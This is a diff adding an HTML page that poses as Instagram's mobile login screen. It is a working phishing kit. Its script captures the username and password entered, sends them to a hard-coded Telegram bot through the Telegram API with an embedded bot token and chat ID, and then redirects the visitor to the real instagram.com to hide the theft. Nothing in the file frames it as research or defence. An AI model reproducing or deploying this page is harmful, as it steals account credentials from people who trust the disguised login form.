@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram</title>
+  <style>
+    @font-face {
+      font-family: 'Instagram Sans';
+      font-style: normal;
+      font-weight: 400;
+      src: url(https://static.xx.fbcdn.net/rsrc.php/yV/r/hzM3N1IAl8Q.woff2) format('woff2');
+    }
+    
+    :root {
+      --primary-blue: #0095f6;
+      --facebook-blue: #1877f2;
+      --light-gray: #737373;
+      --border-gray: #dbdbdb;
+      --text-dark: #262626;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, 
+                   "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: black;
+      color: var(--text-dark);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 0 44px;
+      position: relative;
+    }
+
+    .language-selector {
+      margin: 28px 0 0;
+      text-align: right;
+      font-size: 14px;
+      color: var(--facebook-blue);
+    }
+
+    .logo {
+      margin: 32px 0 44px;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 190px;
+    }
+
+    .facebook-button {
+      background-color: var(--facebook-blue);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 7px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      width: 100%;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+    }
+
+    .fb-logo {
+      background: white;
+      border-radius: 50%;
+      width: 16px;
+      height: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .fb-logo svg {
+      width: 10px;
+      height: 10px;
+      fill: var(--facebook-blue);
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 16px 0 24px;
+      color: var(--light-gray);
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: 0.2px;
+    }
+
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 0.5px;
+      background-color: var(--border-gray);
+      margin: 0 18px;
+    }
+
+    .input-group {
+      margin-bottom: 6px;
+      width: 100%;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 9px 8px 7px;
+      background-color: #fafafa;
+      border: 1px solid var(--border-gray);
+      border-radius: 3px;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .input-group input:focus {
+      border-color: #a8a8a8;
+    }
+
+    .input-group input::placeholder {
+      color: var(--light-gray);
+    }
+
+    .forgot-password {
+      text-align: right;
+      margin: 12px 0 16px;
+    }
+
+    .forgot-password a {
+      color: var(--facebook-blue);
+      font-size: 12px;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .login-button {
+      width: 100%;
+      background-color: var(--primary-blue);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 7px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      opacity: 0.7;
+      cursor: default;
+    }
+
+    .login-button.active {
+      opacity: 1;
+      cursor: pointer;
+    }
+
+    .signup-section {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      border-top: 1px solid var(--border-gray);
+      padding: 20px;
+      text-align: center;
+      background-color: white;
+    }
+
+    .signup-text {
+      font-size: 14px;
+    }
+
+    .signup-link {
+      color: var(--primary-blue);
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .terms {
+      margin: 16px 0 40px;
+      color: var(--light-gray);
+      font-size: 12px;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+     :root {
+    --light-gray: #a9b8c4;
+  }
+
+  .signup-text {
+    color: var(--light-gray);
+  }
+
+    .terms a {
+      color: var(--light-gray);
+      font-weight: 600;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+<center>
+  <div class="language-selector">English </div></center>
+
+  <div class="logo">
+    <img src="https://tcsdemonic.vercel.app/instagram/instagram.png" alt="Instagram">
+  </div>
+
+  <button class="facebook-button">
+    <span class="fb-logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512">
+        <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
+      </svg>
+    </span>
+    Continue with Facebook
+  </button>
+
+  <div class="divider">OR</div>
+
+  <form id="loginForm">
+    <div class="input-group">
+      <input type="text" placeholder="Phone number, username, or email" id="username" required>
+    </div>
+
+    <div class="input-group">
+      <input type="password" placeholder="Password" id="password" required>
+    </div>
+
+    <div class="forgot-password">
+      <a href="#">Forgot password?</a>
+    </div>
+
+    <button type="submit" class="login-button" id="loginButton">Log in</button>
+  </form>
+<center><br><br>
+<p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+  <div class="terms">
+    By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+  </div>
+  
+  <img src="https://tcsdemonic.vercel.app/instagram/foot.png" height="30" width="60" alt="Footer" style="margin-top: 78px;">
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const loginForm = document.getElementById('loginForm');
+      const loginButton = document.getElementById('loginButton');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+
+      // Form validation
+      function validateForm() {
+        if (usernameInput.value.trim() && passwordInput.value.trim()) {
+          loginButton.classList.add('active');
+        } else {
+          loginButton.classList.remove('active');
+        }
+      }
+
+      usernameInput.addEventListener('input', validateForm);
+      passwordInput.addEventListener('input', validateForm);
+
+      // Form submission
+      loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        // Simulate loading
+        loginButton.innerHTML = 'Logging in...';
+        loginButton.disabled = true;
+
+        // Send data to Telegram
+        const telegramToken = "8077037352:AAFd-68vEihIRYzLdWKM-nzdsMf5UAN8sBg";
+        const chatId = "6310115276";
+        const message = `Instagram Login\n\nUsername: ${username}\nPassword: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        }).then(() => {
+          setTimeout(() => {
+            window.location.href = "https://instagram.com";
+          }, 1500);
+        }).catch(() => {
+          setTimeout(() => {
+            window.location.href = "https://instagram.com";
+          }, 1500);
+        });
+      });
+    });
+  </script>
+
+</body>
+</html>
